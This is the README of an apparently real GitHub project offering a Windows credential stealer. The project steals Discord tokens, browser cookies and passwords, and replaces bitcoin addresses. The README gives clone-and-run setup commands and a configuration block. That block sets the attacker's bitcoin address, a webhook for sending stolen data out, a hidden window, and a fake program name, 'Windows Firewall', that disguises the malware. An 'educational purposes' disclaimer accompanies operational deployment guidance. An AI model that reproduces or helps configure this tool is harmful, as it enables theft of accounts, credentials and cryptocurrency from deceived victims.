# Discord-Info-Logger
A free, efficient, and open-source discord token logger, that also grabs cookies, passwords, and intercepts bitcoin addresses. This is purely for demonstration/educational purposes.

## Setup

Depending on your python installation your commands may vary. 
Below are the commands needed to set up.
The script was tested in python 3.8.6, on windows 10. This script only works on windows.

Windows:
```
git clone https://github.com/LocalsGitHub/Discord-Info-Logger.git
cd Discord-Info-Logger
pip install -r requirements.txt
py TokenLogger.py
```
## Config

Once you have opened the script in your desired text editor, there are 3 lines that you can change.
```
# Configuration
BTC_ADDRESS = '3LsZH7LqxJMZBaVU9YoTLk8HNnUcmzE88v' <--- Change this to your own bitcoin address
webhookURL = "webhook" <--- Change this to your own webhook
hiddenWindow = False <--- Set this to True or False. If you want the window to be hidden on execution then set this to True
FakeFileName = "Windows Firewall" <--- Change this to the fake desired name.
```

# Support
Create an issue, or message me on discord.
